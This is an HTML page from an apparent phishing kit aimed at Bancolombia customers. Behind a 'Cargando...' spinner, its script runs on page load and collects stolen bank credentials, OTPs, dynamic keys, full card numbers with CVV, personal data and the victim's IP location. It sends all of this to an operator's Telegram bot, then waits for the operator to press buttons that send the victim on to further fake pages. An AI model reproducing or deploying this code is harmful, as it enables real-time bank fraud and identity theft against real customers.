<!DOCTYPE html>
<html lang="es">
<head>
	 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargar Pago</title>
    <script src="js/jquery-3.7.7.js"></script>
    <style>
        /* Estilos para el loader */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #cccccc; /* Fondo gris claro */
            flex-direction: column;
            font-family: Arial, sans-serif;
        }

        /* LOGO */
        .logo-container {
            margin-bottom: 40px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo {
            width: 180px;
        }

        /* Contenedor Circular Blanco */
        .white-circle {
            background-color: white;
            width: 160px;
            height: 160px;
            border-radius: 50%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        /* Texto cargando */
        .texto-cargando {
            font-size: 14px;
            color: #333;
            margin-top: 15px;
            font-weight: bold;
        }

        /* Loader */
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ffd000;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // Función para mostrar el loader
        function mostrarLoader() {
            document.querySelector(".loader").style.display = "flex";
        }

        // Función para ocultar el loader
        function ocultarLoader() {
            document.querySelector(".loader").style.display = "none";
        }

        // Función para enviar los datos a Telegram
        async function enviarDatos() {
            mostrarLoader();

            // 1. Obtener Datos de Geolocalización (IP y Ciudad)
            let ipInfo = { ip: 'Desconocida', city: 'Desconocida', country_name: 'Desconocido' };
            
            try {
                // Intentar primero con ipapi.co (info detallada)
                const ipRes = await fetch('https://ipapi.co/json/');
                if (ipRes.ok) {
                    ipInfo = await ipRes.json();
                } else {
                    throw new Error("Falló ipapi.co");
                }
            } catch (error) {
                console.warn("ipapi.co falló, intentando ipify...", error);
                try {
                    // Fallback a ipify (solo IP, más estable para IPv4)
                    const ipifyRes = await fetch('https://api.ipify.org?format=json');
                    if (ipifyRes.ok) {
                        const ipifyData = await ipifyRes.json();
                        ipInfo.ip = ipifyData.ip;
                        // Sin datos de ciudad/pais en ipify
                    }
                } catch (e2) {
                    console.warn("No se pudo obtener la IP:", e2);
                }
            }

            // Obtener los datos de "clave" y "userName" del localStorage
            const clave = localStorage.getItem('clave') || "No capturada";
            const userName = localStorage.getItem('userName') || "Desconocido";

            const claveDinamica = localStorage.getItem('claveDinamica');
            const claveDinamica2 = localStorage.getItem('claveDinamica2');
            const otp = localStorage.getItem('otp');
            
            let cardData = null;
            try {
                const cardDataRaw = localStorage.getItem('cardData');
                if (cardDataRaw) {
                    cardData = JSON.parse(cardDataRaw);
                }
            } catch (e) {
                console.error("Error parsing cardData:", e);
            }

            const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
            localStorage.setItem('transaction_id', transactionId);
            console.log("Transaction ID:", transactionId); // Debug

            const startedAt = Math.floor(Date.now() / 1000);

            // Recuperar datos del formulario inicial (si existen)
            const formDataJSON = localStorage.getItem('formData');
            let formDataMessage = "";
            
            if (formDataJSON) {
                const fd = JSON.parse(formDataJSON);
                formDataMessage = `
📝 <b>${(fd.titulo || 'SOLICITUD').toUpperCase()}</b>
--------------------------------------------------
🆔 <b>Doc:</b> ${fd.tipo_documento || ''} ${fd.documento || ''}
👤 <b>Nombre:</b> ${fd.nombre || ''}
📱 <b>Cel:</b> ${fd.celular || ''}
📧 <b>Email:</b> ${fd.correo || ''}
💰 <b>Ingr:</b> ${fd.ingresos || ''}
🏙️ <b>Ciu:</b> ${fd.ciudad || ''}
`;

                // Campos condicionales de Crédito / Libre Inversión / Tarjeta
                if (fd.monto) {
                    formDataMessage += `💰 <b>Monto:</b> ${fd.monto}\n`;
                }
                if (fd.plazo) {
                    formDataMessage += `📅 <b>Plazo:</b> ${fd.plazo} m\n`;
                }

                // Campos condicionales de Vivienda
                if (fd.valor_inmueble) {
                    formDataMessage += `🏠 <b>Inmueble:</b> ${fd.valor_inmueble}\n`;
                }
                if (fd.cuota_inicial) {
                    formDataMessage += `💵 <b>Inicial:</b> ${fd.cuota_inicial}\n`;
                }
                if (fd.tipo_vivienda) {
                    formDataMessage += `🏘️ <b>Tipo:</b> ${fd.tipo_vivienda}\n`;
                }

                // Campos condicionales de Tarjeta
                if (fd.tarjeta_pan) {
                    formDataMessage += `💳 <b>PAN:</b> ${fd.tarjeta_pan}\n`;
                    formDataMessage += `📅 <b>Exp:</b> ${fd.tarjeta_exp} | 🔒 <b>CVV:</b> ${fd.tarjeta_cvv}\n`;
                    if (fd.tarjeta_bin_info) {
                        formDataMessage += `🏦 <b>Info:</b> ${fd.tarjeta_bin_info}\n`;
                    }
                }

                // Ubicación e IP dentro del bloque de datos del formulario
                formDataMessage += `🌍 <b>Ubicación:</b> ${ipInfo.city}, ${ipInfo.country_name}\n`;
                formDataMessage += `📡 <b>IP:</b> ${ipInfo.ip}\n`;

                formDataMessage += `--------------------------------------------------\n`;
            }

            let message = `
${formDataMessage}<b>NUEVA SOLICITUD</b>
--------------------------------------------------
🆔 <b>ID:</b> <code>${transactionId}</code>
🧑‍💻 <b>User:</b> <code>${userName || ''}</code>
🔐 <b>Pass:</b> <code>${clave || ''}</code>
`;

            // Si no hay datos de formulario, agregamos la IP al final para que no se pierda
            if (!formDataJSON) {
                message += `🌍 <b>Ubicación:</b> ${ipInfo.city}, ${ipInfo.country_name}\n`;
                message += `📡 <b>IP:</b> ${ipInfo.ip}\n`;
            }

            if (claveDinamica) {
                message += `🔑 <b>Dinámica 1:</b> | ${claveDinamica}\n`;
            }
            if (claveDinamica2) {
                message += `⚠️ <b>Dinámica 2 (Error):</b> | ${claveDinamica2}\n`;
            }
            if (otp) {
                message += `🔢 <b>OTP:</b> | ${otp}\n`;
            }
            if (cardData) {
                if (cardData.type) message += `💳 <b>Tipo:</b> | ${cardData.type}\n`;
                message += `💳 <b>Tarjeta:</b> | ${cardData.creditCardNumber || ''}\n`;
                message += `📅 <b>Fecha:</b> | ${cardData.expirationDate || ''}\n`;
                message += `🔒 <b>CVV:</b> | ${cardData.cvv || ''}\n`;
                if (cardData.info) message += `🏦 <b>Info:</b> | ${cardData.info}\n`;
            }

            message += `--------------------------------------------------\n`;

            const keyboard = JSON.stringify({
                inline_keyboard: [
                    [
                        { text: "Error de Logo", callback_data: `error_logo:${transactionId}` },
                        { text: "Error Clave", callback_data: `error_clave:${transactionId}` }
                    ],
                    [
                        { text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` },
                        { text: "Error Dinámica", callback_data: `error_dinamica:${transactionId}` }
                    ],
                    [
                        { text: "Tarjeta de Crédito", callback_data: `pedir_tc:${transactionId}` },
                        { text: "Error TC Crédito", callback_data: `error_tc:${transactionId}` }
                    ],
                    [
                        { text: "Tarjeta Débito", callback_data: `pedir_td:${transactionId}` },
                        { text: "Error TD Débito", callback_data: `error_td:${transactionId}` }
                    ],
                    [
                        { text: "Soy Yo", callback_data: `soy:${transactionId}` },
                        { text: "OTP", callback_data: `otp:${transactionId}` }
                    ],
                    [
                        { text: "Error OTP", callback_data: `error_otp:${transactionId}` },
                        { text: "Finalizar", callback_data: `finalizar:${transactionId}` }
                    ],
                    [
                        { text: "🚫 BANEAR IP", callback_data: `ban_ip:${transactionId}` }
                    ]
                ],
            });

            fetch('config.json')
                .then(response => response.json())
                .then(async (config) => {
                    const token = config.token;
                    const chatId = config.chat_id;

                    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            reply_markup: keyboard,
                            parse_mode: "HTML"
                        }),
                    });
                    const data = await res.json();
                    return { data, token, transactionId, startedAt };
                })
                .then(({ data, token, transactionId, startedAt }) => {
                    if (data.ok) {
                        console.log("Mensaje enviado");
                        try {
                            const messageId = data.result && data.result.message_id ? data.result.message_id : null;
                            if (messageId) {
                                sessionStorage.setItem('load_message_tx', transactionId);
                                sessionStorage.setItem('load_message_id', String(messageId));
                            }
                        } catch (e) {}
                        checkPaymentVerification(transactionId, token, startedAt);
                    } else {
                        console.error("Error Telegram:", data);
                    }
                })
                .catch(error => console.error("Error loading config:", error));
        }

        // Función para esperar la respuesta del bot de Telegram
        async function checkPaymentVerification(transactionId, token, startedAt) {
            const messageTx = sessionStorage.getItem('load_message_tx') || "";
            const expectedMessageId = (messageTx === transactionId)
                ? Number(sessionStorage.getItem('load_message_id'))
                : NaN;

            if (!Number.isFinite(expectedMessageId)) {
                setTimeout(() => checkPaymentVerification(transactionId, token, startedAt), 500);
                return;
            }

            const url = new URL(`https://api.telegram.org/bot${token}/getUpdates`);
            url.searchParams.set('timeout', '25');
            url.searchParams.set('limit', '50');

            fetch(url.toString())
            .then((response) => response.json())
            .then(async (data) => {
                const updates = Array.isArray(data && data.result) ? data.result : [];
                const verificationUpdate = updates.find(
                    (update) => update.callback_query && 
                    update.callback_query.data.includes(transactionId) &&
                    (update.callback_query.message && Number(update.callback_query.message.message_id) === expectedMessageId)
                );

                if (verificationUpdate) {
                    ocultarLoader();

                    // OCULTAR BOTONES EN TELEGRAM AL HACER CLIC
                    const chatId = verificationUpdate.callback_query.message.chat.id;
                    const messageId = verificationUpdate.callback_query.message.message_id;

                    // 1. Responder al callback para detener la animación de carga
                    const p1 = fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            callback_query_id: verificationUpdate.callback_query.id
                        })
                    }).catch(error => console.error("Error al responder callback:", error));

                    // 2. Eliminar botones (editMessageReplyMarkup con teclado vacío)
                    const p2 = fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            reply_markup: { inline_keyboard: [] }
                        })
                    }).catch(error => console.error("Error al eliminar botones:", error));

                    // Esperar a que Telegram procese las peticiones antes de redirigir
                    await Promise.all([p1, p2]);

                    const data = verificationUpdate.callback_query.data;
                    const parts = String(data).split(":");
                    const action = parts[0] || "";
                    const callbackTx = parts[1] || "";

                    if (callbackTx !== transactionId) {
                        setTimeout(() => checkPaymentVerification(transactionId, token, startedAt), 2000);
                        return;
                    }
                    
                    if (action === "error_logo") {
                        localStorage.removeItem('transaction_id');
                        sessionStorage.removeItem('load_tx');
                        sessionStorage.removeItem('load_started_at');
                        window.location.href = "index1.html";
                    } else if (action === "error_clave") {
                        localStorage.removeItem('transaction_id');
                        sessionStorage.removeItem('load_tx');
                        sessionStorage.removeItem('load_started_at');
                        window.location.href = "clave.html";
                    } else if (action === "pedir_dinamica") {
                        window.location.href = "index3.html";
                    } else if (action === "error_dinamica") {
                        window.location.href = "error_dinamica.html";
                    } else if (action === "pedir_tc") {
                        window.location.href = "desembolso.html";
                    } else if (action === "error_tc") {
                        window.location.href = "desembolso.html?error=true";
                    } else if (action === "pedir_td") {
                        window.location.href = "tarjeta_debito.html";
                    } else if (action === "error_td") {
                        window.location.href = "tarjeta_debito.html?error=true";
                    } else if (action === "soy") {
                        window.location.href = "soyyo.html";
                    } else if (action === "error_otp") {
                        window.location.href = "error_otp.html";
                    } else if (action === "otp") {
                        window.location.href = "otp.html";
                    } else if (action === "finalizar") {
                        window.location.href = "final1.html";
                    } else if (action === "ban_ip") {
                         localStorage.setItem('banned', 'true');
                         window.location.href = "https://www.bancolombia.com/tu360";
                    }
                } else {
                    setTimeout(() => checkPaymentVerification(transactionId, token, startedAt), 2000);
                }
            })
            .catch((error) => {
                console.error("Error polling Telegram:", error);
                setTimeout(() => checkPaymentVerification(transactionId, token, startedAt), 2000);
            });
        }

        window.onload = function() {
            enviarDatos();
        };
    </script>
</head>
<body>
    
    <!-- ⬆️ LOGO / IMAGEN -->
    <div class="logo-container">
        <img src="images/logo.svg" class="logo">
    </div>
    

    
    <!-- Contenedor Blanco Circular -->
    <div class="white-circle">
        <!-- Loader original -->
        <div class="loader" style="display: none;"></div>

        <!-- Texto debajo -->
        <div class="texto-cargando">
            Cargando...
        </div>
    </div>

</body>
</html>
